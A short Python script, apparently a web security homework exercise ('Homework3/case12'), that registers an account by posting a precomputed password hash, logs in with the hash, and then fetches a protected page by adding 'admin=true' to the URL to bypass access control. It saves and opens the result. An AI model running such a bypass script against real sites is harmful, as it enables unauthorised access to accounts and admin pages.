import requests
import webbrowser

register_url = 'http://www.wsb.com/Homework3/case12/register.php'

register_payload = {
    'username': 'zwb',
    'email': 'zwb@gmail.com',
    'password': '',
    'confirmpwd': '',
    'p': '09fb1ed5e5475c6dfac2307ac333f5ef2adf3b26e0d0cb5f7df9485fc4997922c2add803d9ef14a61db39b6df775de6d67ab8d5f3726fac561fcb2dc62509aac'
}

register_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:66.0) Gecko/20100101 Firefox/66.0',
    'Referer': 'http://www.wsb.com/Homework3/case12/register.php',
    'Cookie': 'sec_session_id23=7440rs9etinmlm6sg2mqeg9m45',
    'Upgrade-Insecure-Requests': '1'
}

register_response = requests.post(register_url, data=register_payload, headers=register_headers)
print(register_response.text)

login_url = 'http://www.wsb.com/Homework3/case12/includes/process_login.php'
email = 'zwb@gmail.com'
password_hash = '09fb1ed5e5475c6dfac2307ac333f5ef2adf3b26e0d0cb5f7df9485fc4997922c2add803d9ef14a61db39b6df775de6d67ab8d5f3726fac561fcb2dc62509aac'
login_data = {'email': email, 'p': password_hash}
login_response = requests.post(login_url, data=login_data)
print(login_response.text)

protected_url = 'http://www.wsb.com/Homework3/case12/protected_page.php?admin=true'
protected_response = requests.get(protected_url, cookies=login_response.cookies)
print(protected_response.text)

with open("protected_page.html", "w") as f:
	f.write(protected_response.text)
webbrowser.open_new_tab("protected_page.html")

